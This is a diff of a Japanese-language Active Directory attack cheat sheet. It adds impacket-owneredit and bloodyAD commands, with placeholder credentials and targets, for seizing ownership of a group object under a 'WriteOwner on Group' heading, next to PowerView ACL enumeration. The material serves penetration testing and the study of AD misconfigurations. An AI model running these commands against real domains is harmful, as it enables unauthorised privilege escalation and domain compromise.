@@ -30,7 +30,23 @@ Get-Objectacl -resolveguids | ? {$_.securityidentifier -eq "<Target_USER_SID>"}
 
 ## WriteOwner on Group
 
-### グループにユーザーを追加
+### 権限の付与
+
+### Linux
+
+#### impacket
+
+```
+impacket-owneredit -action write -owner <USERNAME> -target <TargetObject> <DOMAIN>/<USERNAME>:<PASSWORD>
+```
+
+#### bloodyAD
+
+```
+bloodyAD --host <DC_IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set owner <TargetObject> <ControlledPrincipal>
+```
+
+### Windows
 
 そのユーザーとしてプロセスを実行していない場合は、ターゲットユーザーを完全に制御するユーザーとしてドメインコントローラーを認証する必要があるかもしれない。`Get-DomainObject` と組み合わせてこれを行うには、まず `PSCredential` オブジェクトを作成する。
 
